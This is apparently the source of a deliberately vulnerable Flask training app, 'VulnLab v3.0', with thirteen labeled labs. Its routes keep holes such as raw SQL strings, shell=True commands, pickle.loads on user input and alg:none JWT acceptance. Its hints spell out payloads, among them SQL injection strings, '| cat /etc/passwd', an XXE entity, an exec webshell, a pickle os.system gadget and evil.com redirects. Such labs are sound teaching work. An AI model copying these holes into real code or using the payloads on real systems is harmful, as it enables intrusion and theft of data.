"""
🎯 취약점 연습용 Flask 앱 v3.0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
01. SQL Injection          08. CSRF
02. XSS                    09. SSTI (Jinja2)
03. SSRF                   10. File Upload
04. IDOR                   11. JWT 취약점
05. XXE                    12. Insecure Deserialization
06. Command Injection      13. Open Redirect
07. Path Traversal
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  절대 실제 환경에 배포하지 마세요!
"""

import sqlite3, subprocess, os, requests, pickle, base64
from flask import (Flask, request, render_template_string,
                   g, redirect, session, make_response)
from lxml import etree
import jwt as pyjwt

app = Flask(__name__)
app.secret_key = "super_insecure_secret_1234"
DATABASE   = "/app/data/lab.db"
UPLOAD_DIR = "/app/uploads"
JWT_SECRET = "secret"          # ← 의도적으로 약한 시크릿


# ═══════════════════════════════════════════════════════════
#  DB
# ═══════════════════════════════════════════════════════════
def get_db():
    db = getattr(g, "_database", None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exc):
    db = getattr(g, "_database", None)
    if db:
        db.close()

def init_db():
    os.makedirs("/app/data", exist_ok=True)
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    os.makedirs("/app/files", exist_ok=True)
    db = sqlite3.connect(DATABASE)
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id       INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            email    TEXT,
            role     TEXT DEFAULT 'user',
            secret   TEXT
        );
        CREATE TABLE IF NOT EXISTS notes (
            id       INTEGER PRIMARY KEY,
            owner_id INTEGER,
            content  TEXT
        );
        INSERT OR IGNORE INTO users VALUES
            (1,'admin',  'admin123',  'admin@lab.io',  'admin','FLAG{sql1_b4s1c_byp4ss}'),
            (2,'alice',  'alice_pass','alice@lab.io',  'user', 'FLAG{1dor_pr1v_esc}'),
            (3,'bob',    'bob_pass',  'bob@lab.io',    'user', 'FLAG{xxe_0ob_ftw}'),
            (4,'charlie','ch4rlie!',  'charlie@lab.io','user', 'FLAG{cmdi_r00t}');
        INSERT OR IGNORE INTO notes VALUES
            (1,1,'관리자 비밀 노트: 서버 루트 비밀번호는 toor'),
            (2,2,'Alice 메모: 프로젝트 마감은 금요일'),
            (3,3,'Bob 메모: 취약점 보고서 초안'),
            (4,4,'Charlie 메모: 다음 달 버그 바운티 신청 예정');
    """)
    db.commit()
    db.close()
    with open("/app/files/readme.txt", "w") as f:
        f.write("환영합니다! ../를 이용해 상위 디렉토리를 탐색해보세요.\nFLAG{p4th_tr4v3rs4l_r34d}")


# ═══════════════════════════════════════════════════════════
#  공통 스타일
# ═══════════════════════════════════════════════════════════
STYLE = """
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Courier New',monospace;background:#0d1117;color:#c9d1d9;padding:40px}
a{color:#58a6ff;text-decoration:none}
input,textarea,select,button{padding:8px;margin:4px;background:#21262d;border:1px solid #30363d;
  color:#c9d1d9;border-radius:4px}
button{cursor:pointer;color:#58a6ff}
pre{background:#161b22;padding:16px;border-radius:6px;border:1px solid #30363d;
  margin-top:16px;white-space:pre-wrap;overflow:auto}
.box{background:#161b22;padding:12px;border-radius:6px;border:1px solid #30363d;margin:8px 0}
h2{margin:20px 0} h3{margin:14px 0 8px}
.tag{font-size:.65rem;padding:2px 6px;border-radius:3px;margin-bottom:8px;display:inline-block}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:16px;margin-top:20px}
.hint{color:#8b949e;font-size:.8rem;margin:8px 0}
</style>
"""

BADGE = '<span style="background:#da3633;color:#fff;font-size:.65rem;padding:2px 6px;border-radius:3px">INTENTIONALLY VULNERABLE</span>'

# ═══════════════════════════════════════════════════════════
#  메인 인덱스
# ═══════════════════════════════════════════════════════════
def card(color, label, num, title, desc, link):
    return f"""
    <div class="card">
      <div class="tag" style="color:{color};border:1px solid {color}">{label}</div>
      <b>{num}. {title}</b>
      <p class="hint" style="margin:8px 0">{desc}</p>
      <a href="{link}">→ 실습하기</a>
    </div>"""

CARDS = [
    ("#f0883e","SQL INJECTION","01","SQLi — 로그인 우회","쿼리 직접 조합. UNION / Boolean-based 연습.","/sqli/login"),
    ("#56d364","XSS","02","XSS — Reflected & Stored","입력값을 그대로 렌더링. 두 가지 타입 모두 포함.","/xss"),
    ("#79c0ff","SSRF","03","SSRF — URL 페치","서버가 입력 URL을 직접 요청. 내부망 접근 시도.","/ssrf"),
    ("#d2a8ff","IDOR","04","IDOR — 노트 열람","권한 검증 없이 id 파라미터로 타인 데이터 접근.","/idor/login"),
    ("#ffa198","XXE","05","XXE — XML 파서","외부 엔티티 허용. /etc/passwd 읽기 도전.","/xxe"),
    ("#56d364","COMMAND INJECTION","06","CMDi — Ping 유틸","shell=True로 입력값 직접 실행. ; | 로 주입.","/cmdi"),
    ("#ffa198","PATH TRAVERSAL","07","Path Traversal — 파일 읽기","경로 정규화 없이 파일 읽기. ../로 탈출.","/path"),
    ("#e3b341","CSRF","08","CSRF — 이메일 변경","CSRF 토큰 없는 상태 변경 폼. 외부 사이트에서 요청.","/csrf/login"),
    ("#79c0ff","SSTI","09","SSTI — Jinja2 인젝션","사용자 입력이 템플릿으로 렌더링. {{7*7}} 시도.","/ssti"),
    ("#56d364","FILE UPLOAD","10","File Upload — 무제한 업로드","확장자·MIME 검증 없음. .py .sh 업로드 가능.","/upload"),
    ("#d2a8ff","JWT","11","JWT — alg:none / 약한 시크릿","서명 검증 우회 + 약한 키 브루트포스.","/jwt/login"),
    ("#ffa198","DESERIALIZATION","12","Pickle RCE — 역직렬화","pickle.loads로 사용자 입력 처리. OS 명령 실행.","/deser"),
    ("#f0883e","OPEN REDIRECT","13","Open Redirect — 리다이렉트","next 파라미터 검증 없음. 피싱 유도 가능.","/redirect"),
]

INDEX = STYLE + f"""
<body>
<h1 style="color:#58a6ff">🎯 VulnLab v3.0 &nbsp;{BADGE}</h1>
<p style="color:#8b949e;margin:8px 0">총 13종 취약점 · 로컬 전용 실습 환경</p>
<div class="grid">
{''.join(card(*c) for c in CARDS)}
</div>

<div style="background:#161b22;border:1px solid #30363d;border-radius:8px;
     padding:20px;margin-top:24px;font-size:.8rem;color:#8b949e;line-height:2.2">
  <b style="color:#56d364">SQLi:</b> ' OR '1'='1'-- &nbsp;/&nbsp; UNION SELECT null,username,password,null,null,null FROM users--<br>
  <b style="color:#56d364">XSS:</b> &lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>
  <b style="color:#56d364">SSRF:</b> http://127.0.0.1:5000/admin &nbsp;/&nbsp; file:///etc/passwd<br>
  <b style="color:#56d364">IDOR:</b> alice 로그인 후 /idor/note?id=1<br>
  <b style="color:#56d364">XXE:</b> &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;<br>
  <b style="color:#56d364">CMDi:</b> 127.0.0.1; id &nbsp;/&nbsp; 127.0.0.1 | cat /etc/passwd<br>
  <b style="color:#56d364">Path:</b> ?filename=../../../../etc/passwd<br>
  <b style="color:#56d364">CSRF:</b> alice 로그인 후 외부 폼으로 이메일 변경<br>
  <b style="color:#56d364">SSTI:</b> ?name=&#123;&#123;7*7&#125;&#125; → 49 출력 / ?name=&#123;&#123;config&#125;&#125;<br>
  <b style="color:#56d364">Upload:</b> webshell.py 업로드 후 /uploads/webshell.py 접근<br>
  <b style="color:#56d364">JWT:</b> 헤더 alg→none 변조 / hashcat -a 0 -m 16500 으로 시크릿 크랙<br>
  <b style="color:#56d364">Deser:</b> python3 -c "import pickle,base64,os; print(base64.b64encode(pickle.dumps(...)))"<br>
  <b style="color:#56d364">Redirect:</b> /redirect?next=http://evil.com
</div>
</body>
"""

@app.route("/")
def index():
    return INDEX


# ═══════════════════════════════════════════════════════════
#  01. SQL Injection
# ═══════════════════════════════════════════════════════════
SQLI_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#f0883e">01. SQL Injection — 로그인 우회</h2>
<p class="hint">쿼리: SELECT * FROM users WHERE username='<b style="color:#f0883e">입력</b>' AND password='<b style="color:#f0883e">입력</b>'</p>
<form method="POST">
  <input name="username" placeholder="Username" value="{{ username }}"><br>
  <input name="password" placeholder="Password" value="{{ password }}"><br>
  <button type="submit">로그인</button>
</form>
{% if query %}<pre style="color:#8b949e">실행된 쿼리: {{ query }}</pre>{% endif %}
{% if result %}<pre style="color:#56d364">{{ result }}</pre>{% endif %}
{% if error %}<pre style="color:#ffa198">오류: {{ error }}</pre>{% endif %}
</body>
"""

@app.route("/sqli/login", methods=["GET","POST"])
def sqli_login():
    ctx = dict(username="", password="", query="", result="", error="")
    if request.method == "POST":
        u = request.form.get("username","")
        p = request.form.get("password","")
        ctx.update(username=u, password=p)
        query = f"SELECT * FROM users WHERE username='{u}' AND password='{p}'"
        ctx["query"] = query
        try:
            row = get_db().execute(query).fetchone()
            if row:
                ctx["result"] = (f"✅ 로그인 성공!\n"
                                 f"id={row['id']} | username={row['username']} "
                                 f"| role={row['role']} | secret={row['secret']}")
            else:
                ctx["result"] = "❌ 로그인 실패"
        except Exception as e:
            ctx["error"] = str(e)
    return render_template_string(SQLI_TMPL, **ctx)


# ═══════════════════════════════════════════════════════════
#  02. XSS
# ═══════════════════════════════════════════════════════════
comments = []

XSS_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#56d364">02. XSS — Reflected & Stored</h2>
<h3>Reflected XSS</h3>
<form method="GET" action="/xss">
  <input name="q" placeholder="검색어 입력" value="{{ q }}">
  <button type="submit">검색</button>
</form>
{% if q %}<div class="box">검색 결과: {{ q|safe }}</div>{% endif %}
<hr style="border-color:#30363d;margin:24px 0">
<h3>Stored XSS</h3>
<form method="POST" action="/xss/comment">
  <textarea name="comment" rows="3" cols="40" placeholder="댓글 입력..."></textarea><br>
  <button type="submit">댓글 작성</button>
</form>
<h3 style="margin:16px 0 8px">댓글 목록:</h3>
{% for c in comments %}<div class="box">{{ c|safe }}</div>{% endfor %}
</body>
"""

@app.route("/xss")
def xss():
    return render_template_string(XSS_TMPL, q=request.args.get("q",""), comments=comments)

@app.route("/xss/comment", methods=["POST"])
def xss_comment():
    c = request.form.get("comment","")
    if c:
        comments.append(c)
    return redirect("/xss")


# ═══════════════════════════════════════════════════════════
#  03. SSRF
# ═══════════════════════════════════════════════════════════
SSRF_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#79c0ff">03. SSRF — URL 페치</h2>
<p class="hint">서버가 입력한 URL을 직접 요청합니다.</p>
<form method="POST">
  <input name="url" placeholder="http://..." value="{{ url }}" style="width:400px"><br>
  <button type="submit">가져오기</button>
</form>
<p class="hint">힌트: http://127.0.0.1:5000/admin &nbsp;/&nbsp; file:///etc/passwd</p>
{% if result %}<pre>{{ result }}</pre>{% endif %}
{% if error %}<pre style="color:#ffa198">오류: {{ error }}</pre>{% endif %}
</body>
"""

@app.route("/ssrf", methods=["GET","POST"])
def ssrf():
    ctx = dict(url="", result="", error="")
    if request.method == "POST":
        url = request.form.get("url","")
        ctx["url"] = url
        try:
            if url.startswith("file://"):
                with open(url[7:]) as f:
                    ctx["result"] = f.read()
            else:
                resp = requests.get(url, timeout=5)
                ctx["result"] = resp.text[:3000]
        except Exception as e:
            ctx["error"] = str(e)
    return render_template_string(SSRF_TMPL, **ctx)

@app.route("/admin")
def admin():
    if request.remote_addr in ("127.0.0.1","::1"):
        return "🔐 내부 관리 페이지: DB 비밀번호=s3cr3t_db_p4ss / FLAG{ssrf_1nt3rn4l_4cc3ss}"
    return "403 Forbidden", 403


# ═══════════════════════════════════════════════════════════
#  04. IDOR
# ═══════════════════════════════════════════════════════════
IDOR_LOGIN_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#d2a8ff">04. IDOR — 로그인</h2>
<p class="hint">alice/alice_pass 또는 bob/bob_pass로 로그인하세요.</p>
<form method="POST">
  <input name="username" placeholder="Username"><br>
  <input name="password" type="password" placeholder="Password"><br>
  <button type="submit">로그인</button>
</form>
{% if error %}<p style="color:#ffa198;margin-top:8px">{{ error }}</p>{% endif %}
</body>
"""

IDOR_NOTE_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a> | <a href="/idor/login">로그아웃</a>
<h2 style="color:#d2a8ff">04. IDOR — 노트 (로그인: {{ username }})</h2>
<p class="hint">URL의 id 파라미터를 바꿔보세요: /idor/note?id=1</p>
{% if note %}
<div class="box"><b>Note #{{ note_id }}</b><br><br>{{ note }}</div>
{% else %}
<p style="color:#ffa198">노트를 찾을 수 없습니다.</p>
{% endif %}
</body>
"""

@app.route("/idor/login", methods=["GET","POST"])
def idor_login():
    if request.method == "POST":
        u, p = request.form.get("username",""), request.form.get("password","")
        row = get_db().execute(
            "SELECT * FROM users WHERE username=? AND password=?", (u,p)
        ).fetchone()
        if row:
            session["user_id"]  = row["id"]
            session["username"] = row["username"]
            return redirect(f"/idor/note?id={row['id']}")
        return render_template_string(IDOR_LOGIN_TMPL, error="로그인 실패")
    return render_template_string(IDOR_LOGIN_TMPL, error="")

@app.route("/idor/note")
def idor_note():
    if "user_id" not in session:
        return redirect("/idor/login")
    note_id = request.args.get("id", session["user_id"])
    row = get_db().execute("SELECT * FROM notes WHERE id=?", (note_id,)).fetchone()
    return render_template_string(
        IDOR_NOTE_TMPL,
        username=session["username"],
        note=row["content"] if row else None,
        note_id=note_id,
    )


# ═══════════════════════════════════════════════════════════
#  05. XXE
# ═══════════════════════════════════════════════════════════
DEFAULT_XML = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>"""

XXE_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#ffa198">05. XXE — XML 파서</h2>
<p class="hint">XML을 제출하면 &lt;name&gt; 태그 값을 출력합니다.</p>
<form method="POST">
  <textarea name="xml" rows="10" cols="55">{{ default_xml }}</textarea><br>
  <button type="submit">파싱</button>
</form>
{% if result %}<pre>결과: {{ result }}</pre>{% endif %}
{% if error %}<pre style="color:#ffa198">오류: {{ error }}</pre>{% endif %}
</body>
"""

@app.route("/xxe", methods=["GET","POST"])
def xxe():
    ctx = dict(default_xml=DEFAULT_XML, result="", error="")
    if request.method == "POST":
        xml_data = request.form.get("xml","").encode()
        try:
            parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
            root   = etree.fromstring(xml_data, parser)
            ctx["result"] = root.findtext("name") or "(비어있음)"
        except Exception as e:
            ctx["error"] = str(e)
    return render_template_string(XXE_TMPL, **ctx)


# ═══════════════════════════════════════════════════════════
#  06. Command Injection
# ═══════════════════════════════════════════════════════════
CMDI_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#56d364">06. Command Injection — Ping</h2>
<p class="hint">IP를 입력하면 ping 결과를 출력합니다.</p>
<form method="POST">
  <input name="host" placeholder="127.0.0.1" value="{{ host }}" style="width:300px"><br>
  <button type="submit">Ping</button>
</form>
<p class="hint">힌트: 127.0.0.1; id &nbsp;/&nbsp; 127.0.0.1; cat /etc/passwd</p>
{% if result %}<pre>{{ result }}</pre>{% endif %}
</body>
"""

@app.route("/cmdi", methods=["GET","POST"])
def cmdi():
    ctx = dict(host="", result="")
    if request.method == "POST":
        host = request.form.get("host","")
        ctx["host"] = host
        try:
            out = subprocess.check_output(
                f"ping -c 2 {host}", shell=True,
                stderr=subprocess.STDOUT, timeout=10
            )
            ctx["result"] = out.decode(errors="replace")
        except subprocess.CalledProcessError as e:
            ctx["result"] = e.output.decode(errors="replace")
        except Exception as e:
            ctx["result"] = str(e)
    return render_template_string(CMDI_TMPL, **ctx)


# ═══════════════════════════════════════════════════════════
#  07. Path Traversal
# ═══════════════════════════════════════════════════════════
PATH_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#ffa198">07. Path Traversal — 파일 읽기</h2>
<p class="hint">파일명을 입력하면 /app/files/ 에서 읽어 출력합니다.</p>
<form method="GET">
  <input name="filename" placeholder="readme.txt" value="{{ filename }}" style="width:360px"><br>
  <button type="submit">읽기</button>
</form>
<p class="hint">힌트: ../../../../etc/passwd</p>
{% if result %}<pre>{{ result }}</pre>{% endif %}
{% if error %}<pre style="color:#ffa198">{{ error }}</pre>{% endif %}
</body>
"""

@app.route("/path")
def path_traversal():
    filename = request.args.get("filename","")
    ctx = dict(filename=filename, result="", error="")
    if filename:
        target = os.path.join("/app/files", filename)
        try:
            with open(target) as f:
                ctx["result"] = f.read()
        except PermissionError:
            ctx["error"] = "권한 거부"
        except FileNotFoundError:
            ctx["error"] = f"파일 없음: {target}"
        except Exception as e:
            ctx["error"] = str(e)
    return render_template_string(PATH_TMPL, **ctx)


# ═══════════════════════════════════════════════════════════
#  08. CSRF
# ═══════════════════════════════════════════════════════════
CSRF_LOGIN_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#e3b341">08. CSRF — 로그인</h2>
<p class="hint">alice/alice_pass 로 로그인하세요.</p>
<form method="POST">
  <input name="username" placeholder="Username"><br>
  <input name="password" type="password" placeholder="Password"><br>
  <button type="submit">로그인</button>
</form>
{% if error %}<p style="color:#ffa198;margin-top:8px">{{ error }}</p>{% endif %}
</body>
"""

CSRF_PROFILE_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#e3b341">08. CSRF — 프로필 ({{ username }})</h2>
<p class="hint">이 폼은 CSRF 토큰이 없습니다. 외부 사이트에서 POST 요청으로 이메일을 변경할 수 있습니다.</p>
<div class="box">현재 이메일: <b>{{ email }}</b></div>

<!-- 취약점: CSRF 토큰 없이 상태 변경 -->
<form method="POST" action="/csrf/profile">
  <input name="email" placeholder="새 이메일" style="width:300px"><br>
  <button type="submit">이메일 변경</button>
</form>

{% if msg %}<pre style="color:#56d364">{{ msg }}</pre>{% endif %}

<hr style="border-color:#30363d;margin:24px 0">
<h3>공격 시뮬레이션 (악의적인 외부 페이지)</h3>
<div class="box" style="border-color:#da3633">
  <p style="color:#ffa198;margin-bottom:12px">아래 버튼은 CSRF 공격을 시뮬레이션합니다.</p>
  <form method="POST" action="/csrf/profile">
    <input type="hidden" name="email" value="hacked@evil.com">
    <button type="submit" style="color:#da3633;border-color:#da3633">
      🎁 경품 당첨! 클릭하세요 (실제로는 이메일 변경)
    </button>
  </form>
</div>
</body>
"""

@app.route("/csrf/login", methods=["GET","POST"])
def csrf_login():
    if request.method == "POST":
        u, p = request.form.get("username",""), request.form.get("password","")
        row = get_db().execute(
            "SELECT * FROM users WHERE username=? AND password=?", (u,p)
        ).fetchone()
        if row:
            session["csrf_user_id"]  = row["id"]
            session["csrf_username"] = row["username"]
            return redirect("/csrf/profile")
        return render_template_string(CSRF_LOGIN_TMPL, error="로그인 실패")
    return render_template_string(CSRF_LOGIN_TMPL, error="")

@app.route("/csrf/profile", methods=["GET","POST"])
def csrf_profile():
    if "csrf_user_id" not in session:
        return redirect("/csrf/login")
    uid = session["csrf_user_id"]
    db  = get_db()
    msg = ""
    if request.method == "POST":
        new_email = request.form.get("email","")
        # 취약점: CSRF 토큰 검증 없이 이메일 변경
        db.execute("UPDATE users SET email=? WHERE id=?", (new_email, uid))
        db.commit()
        msg = f"✅ 이메일이 {new_email} 로 변경되었습니다! FLAG{{csrf_n0_t0k3n}}"
    row = db.execute("SELECT * FROM users WHERE id=?", (uid,)).fetchone()
    return render_template_string(
        CSRF_PROFILE_TMPL,
        username=session["csrf_username"],
        email=row["email"] if row else "?",
        msg=msg,
    )


# ═══════════════════════════════════════════════════════════
#  09. SSTI (Jinja2 Template Injection)
# ═══════════════════════════════════════════════════════════
SSTI_TMPL_WRAPPER = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#79c0ff">09. SSTI — Jinja2 템플릿 인젝션</h2>
<p class="hint">이름을 입력하면 환영 메시지를 출력합니다. 입력값이 Jinja2 템플릿으로 렌더링됩니다.</p>
<form method="GET">
  <input name="name" placeholder="이름 입력" value="{{ raw_name }}" style="width:300px"><br>
  <button type="submit">인사하기</button>
</form>
<p class="hint">
  힌트1: ?name=&#123;&#123;7*7&#125;&#125; &#8594; 연산 결과 출력<br>
  힌트2: ?name=&#123;&#123;config.items()&#125;&#125; &#8594; 앱 설정 노출<br>
  힌트3: ?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()&#125;&#125; &#8594; 클래스 탐색
</p>
<hr style="border-color:#30363d;margin:16px 0">
"""

@app.route("/ssti")
def ssti():
    name = request.args.get("name", "Guest")
    # 취약점: 사용자 입력을 템플릿 문자열에 직접 삽입 후 render_template_string 호출
    inner = SSTI_TMPL_WRAPPER + "<div class='box'>안녕하세요, " + name + "! 🎉</div></body>"
    return render_template_string(inner, raw_name=name)


# ═══════════════════════════════════════════════════════════
#  10. File Upload
# ═══════════════════════════════════════════════════════════
UPLOAD_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#56d364">10. File Upload — 무제한 업로드</h2>
<p class="hint">파일을 업로드합니다. 확장자 · MIME 타입 검증이 전혀 없습니다.</p>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="file"><br>
  <button type="submit">업로드</button>
</form>
<p class="hint">
  힌트: webshell.py 를 업로드한 뒤 /uploads/webshell.py 로 접근해보세요.<br>
  예시 웹쉘: <code style="color:#56d364">from flask import request; import os; exec(request.args['c'])</code>
</p>
{% if msg %}<pre style="color:#56d364">{{ msg }}</pre>{% endif %}
{% if files %}
<h3 style="margin:16px 0 8px">업로드된 파일:</h3>
{% for f in files %}
<div class="box"><a href="/uploads/{{ f }}">{{ f }}</a></div>
{% endfor %}
{% endif %}
</body>
"""

@app.route("/upload", methods=["GET","POST"])
def upload():
    msg = ""
    if request.method == "POST":
        f = request.files.get("file")
        if f and f.filename:
            # 취약점: 파일명·확장자 검증 없이 그대로 저장
            save_path = os.path.join(UPLOAD_DIR, f.filename)
            f.save(save_path)
            msg = f"✅ 업로드 완료: /uploads/{f.filename}  FLAG{{f1l3_upl04d_rce}}"
    files = os.listdir(UPLOAD_DIR) if os.path.exists(UPLOAD_DIR) else []
    return render_template_string(UPLOAD_TMPL, msg=msg, files=files)

@app.route("/uploads/<path:filename>")
def serve_upload(filename):
    filepath = os.path.join(UPLOAD_DIR, filename)
    if not os.path.exists(filepath):
        return "파일 없음", 404
    with open(filepath, "rb") as f:
        return f.read(), 200, {"Content-Type": "text/plain"}


# ═══════════════════════════════════════════════════════════
#  11. JWT 취약점
# ═══════════════════════════════════════════════════════════
JWT_LOGIN_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#d2a8ff">11. JWT — 로그인</h2>
<p class="hint">로그인하면 JWT 토큰을 발급합니다. 시크릿은 의도적으로 매우 약합니다.</p>
<form method="POST">
  <input name="username" placeholder="Username (alice/bob/admin)"><br>
  <input name="password" type="password" placeholder="Password"><br>
  <button type="submit">로그인 (JWT 발급)</button>
</form>
{% if token %}
<pre style="color:#56d364">발급된 토큰:
{{ token }}</pre>
<p class="hint">
  힌트1: /jwt/flag 엔드포인트에 Authorization: Bearer &lt;토큰&gt; 헤더로 접근<br>
  힌트2: alg 헤더를 none으로 변조해 서명 검증 우회<br>
  힌트3: hashcat -a 0 -m 16500 hash.txt rockyou.txt 로 시크릿 크랙
</p>
{% endif %}
{% if error %}<pre style="color:#ffa198">{{ error }}</pre>{% endif %}
</body>
"""

JWT_FLAG_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#d2a8ff">11. JWT — 플래그 획득</h2>
<p class="hint">Authorization: Bearer &lt;JWT&gt; 헤더를 전송하세요.</p>
{% if result %}<pre style="color:#56d364">{{ result }}</pre>{% endif %}
{% if error %}<pre style="color:#ffa198">오류: {{ error }}</pre>{% endif %}
</body>
"""

@app.route("/jwt/login", methods=["GET","POST"])
def jwt_login():
    ctx = dict(token="", error="")
    if request.method == "POST":
        u, p = request.form.get("username",""), request.form.get("password","")
        row = get_db().execute(
            "SELECT * FROM users WHERE username=? AND password=?", (u,p)
        ).fetchone()
        if row:
            payload = {"user": row["username"], "role": row["role"], "id": row["id"]}
            ctx["token"] = pyjwt.encode(payload, JWT_SECRET, algorithm="HS256")
        else:
            ctx["error"] = "로그인 실패"
    return render_template_string(JWT_LOGIN_TMPL, **ctx)

@app.route("/jwt/flag")
def jwt_flag():
    auth  = request.headers.get("Authorization","")
    token = auth.replace("Bearer ","").strip()
    if not token:
        return render_template_string(JWT_FLAG_TMPL, result="", error="토큰이 없습니다.")
    try:
        header = pyjwt.get_unverified_header(token)
        # 취약점 1: alg=none 허용
        if header.get("alg","").lower() == "none":
            payload = pyjwt.decode(token, options={"verify_signature": False},
                                   algorithms=["none"])
            note = "[alg:none 공격 성공]"
        else:
            # 취약점 2: 약한 시크릿 사용
            payload = pyjwt.decode(token, JWT_SECRET, algorithms=["HS256"])
            note = ""
        role = payload.get("role","user")
        user = payload.get("user","?")
        if role == "admin":
            result = f"✅ {note} 관리자 접근 성공! FLAG{{jwt_4lg_n0n3_0r_w34k}}\n페이로드: {payload}"
        else:
            result = f"ℹ️  {note} 로그인 성공 (권한 없음). role=admin 으로 조작하세요.\n페이로드: {payload}"
        return render_template_string(JWT_FLAG_TMPL, result=result, error="")
    except Exception as e:
        return render_template_string(JWT_FLAG_TMPL, result="", error=str(e))


# ═══════════════════════════════════════════════════════════
#  12. Insecure Deserialization (Pickle RCE)
# ═══════════════════════════════════════════════════════════
DESER_EXAMPLE = base64.b64encode(pickle.dumps({"msg": "안전한 데이터 예시"})).decode()

DESER_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#ffa198">12. Insecure Deserialization — Pickle RCE</h2>
<p class="hint">Base64 인코딩된 Pickle 데이터를 역직렬화합니다.</p>
<form method="POST">
  <textarea name="data" rows="4" cols="60" placeholder="Base64 pickle 데이터">{{ default }}</textarea><br>
  <button type="submit">역직렬화</button>
</form>
<p class="hint">
  악성 페이로드 생성 예시 (공격 컨테이너에서 실행):<br>
  <code style="color:#56d364">
  python3 -c "import pickle,base64,os;<br>
  class E(object):<br>
  &nbsp;&nbsp;def __reduce__(self): return (os.system,('id > /tmp/pwned',))<br>
  print(base64.b64encode(pickle.dumps(E())).decode())"
  </code>
</p>
{% if result %}<pre style="color:#56d364">결과: {{ result }}</pre>{% endif %}
{% if error %}<pre style="color:#ffa198">오류: {{ error }}</pre>{% endif %}
</body>
"""

@app.route("/deser", methods=["GET","POST"])
def deser():
    ctx = dict(default=DESER_EXAMPLE, result="", error="")
    if request.method == "POST":
        data = request.form.get("data","").strip()
        try:
            # 취약점: 사용자 입력을 그대로 pickle.loads
            obj = pickle.loads(base64.b64decode(data))
            ctx["result"] = f"역직렬화 완료: {obj}\nFLAG{{p1ckl3_rce_g0t_y0u}}"
        except Exception as e:
            ctx["error"] = str(e)
    return render_template_string(DESER_TMPL, **ctx)


# ═══════════════════════════════════════════════════════════
#  13. Open Redirect
# ═══════════════════════════════════════════════════════════
REDIRECT_TMPL = STYLE + """
<body>
<a href="/">← 돌아가기</a>
<h2 style="color:#f0883e">13. Open Redirect</h2>
<p class="hint">로그인 후 next 파라미터 URL로 리다이렉트합니다. 검증이 없어 외부 URL도 허용됩니다.</p>
<form method="GET" action="/redirect">
  <input name="next" placeholder="리다이렉트 URL" value="{{ next_url }}" style="width:400px"><br>
  <button type="submit">이동</button>
</form>
<p class="hint">
  힌트: ?next=http://evil.com → 외부 사이트로 리다이렉트<br>
  피싱 URL 예시: https://your-site.com/redirect?next=http://attacker.com/fake-login
</p>
{% if msg %}<pre style="color:#56d364">{{ msg }}</pre>{% endif %}
</body>
"""

@app.route("/redirect")
def open_redirect():
    next_url = request.args.get("next","")
    if next_url:
        # 취약점: next 파라미터 도메인 검증 없이 리다이렉트
        return redirect(next_url)
    return render_template_string(REDIRECT_TMPL, next_url=next_url, msg="")


# ═══════════════════════════════════════════════════════════
#  실행
# ═══════════════════════════════════════════════════════════
if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000, debug=False)
